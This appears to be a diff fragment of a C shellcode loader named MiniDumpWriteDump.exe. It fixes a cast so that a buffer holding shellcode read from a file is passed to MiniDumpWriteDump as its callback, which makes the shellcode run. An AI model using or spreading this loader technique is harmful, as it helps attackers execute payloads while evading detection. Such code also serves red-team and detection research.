@@ -15,7 +15,7 @@ INT wmain(INT argc, WCHAR* argv[])
 	BOOL Ret = FALSE;
 	DWORD SCLen = 0;
 	PCHAR Shellcode = NULL;
-	
+
 	if (argc != 2)
 	{
 		printf("Usage: MiniDumpWriteDump.exe C:\\Path\\To\\Shellcode.bin");
@@ -33,7 +33,7 @@ INT wmain(INT argc, WCHAR* argv[])
 	memcpy(hAlloc, Shellcode, SCLen);
 
 	MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), NULL,
-		MiniDumpNormal, NULL, NULL, (PMINIDUMP_USER_STREAM_INFORMATION)&hAlloc);
+		MiniDumpNormal, NULL, NULL, (PMINIDUMP_CALLBACK_INFORMATION)&hAlloc);
 
 CLEANUP:
 	if (Shellcode)
